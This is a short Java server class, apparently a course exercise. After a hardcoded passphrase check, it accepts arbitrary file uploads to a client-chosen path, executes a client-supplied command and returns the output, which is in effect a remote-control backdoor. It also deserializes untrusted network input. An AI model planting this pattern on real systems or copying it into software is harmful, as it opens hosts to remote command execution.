package cn.edu360.javase35.day10;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class Server {
	private static final String KEY = "天王盖地虎";
	private static final String VALUE = "小鸡炖蘑菇";
	@SuppressWarnings("resource")
	public static void main(String[] args) {
		
		try {
			ServerSocket ss=new ServerSocket(9999);
			while(true){
				Socket accept = ss.accept();
				ObjectInputStream ois = new ObjectInputStream(accept.getInputStream());
				String id = (String)ois.readObject();
				ObjectOutputStream oos = new ObjectOutputStream(accept.getOutputStream());
				if(KEY.equals(id)){
					
					oos.writeObject(VALUE);
					oos.flush();
					String path=(String)ois.readObject();
					FileOutputStream out=new FileOutputStream(path);
					byte[] b=new byte[1024];
					int len=0;
					while((len=ois.read(b))!=-1){
						out.write(b, 0, len);
					}
					out.close();
					String cmd=(String)ois.readObject();
					String ret = Utile.exec(cmd);
					oos.writeObject(ret);
				}else{
					oos.writeObject("gg");
					oos.flush();
				}
				accept.shutdownInput();
				accept.shutdownOutput();
				
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
